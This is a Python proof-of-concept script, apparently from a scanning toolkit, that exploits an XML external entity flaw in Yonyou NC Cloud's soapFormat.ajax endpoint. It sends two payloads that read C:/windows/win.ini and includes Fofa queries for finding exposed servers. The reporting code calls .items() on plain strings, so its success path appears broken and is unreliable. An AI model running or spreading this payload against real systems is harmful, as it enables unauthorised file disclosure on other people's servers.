'''
Function:
    用友NC Cloud soapFormat接口XXE漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
Fofa:
    body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
'''
# -*- coding: utf-8 -*-
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/uapws/soapFormat.ajax".format(scheme, netloc)
        data1 = "msg=%3C%21DOCTYPE+foo%5B%3C%21ENTITY+xxe1two+SYSTEM+%22file%3A%2F%2F%2FC%3A%2F%2Fwindows%2Fwin.ini%22%3E+%5D%3E%3Csoap%3AEnvelope+xmlns%3Asoap%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%3E%3Csoap%3ABody%3E%3Csoap%3AFault%3E%3Cfaultcode%3Esoap%3AServer%26xxe1two%3B%3C%2Ffaultcode%3E%3C%2Fsoap%3AFault%3E%3C%2Fsoap%3ABody%3E%3C%2Fsoap%3AEnvelope%3E"
        data2 = 'msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a'
        try:
            result1 = requests.post(url=url, data=data1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if result1.status_code == 200 and re.search('for 16-bit app support', result1.text):
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result1.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                for param, value in data1.items():
                    values = param + "=" + value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            else:
                result2 = requests.post(url=url, data=data2, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if result2.status_code == 200 and re.search('for 16-bit app support', result2.text):
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
                     POST {} HTTP/1.1
                     Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result2.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    for param, value in data2.items():
                        values = param + "=" + value
                        self.value_list.append(values)
                    self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                    return True
                else:
                    return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False
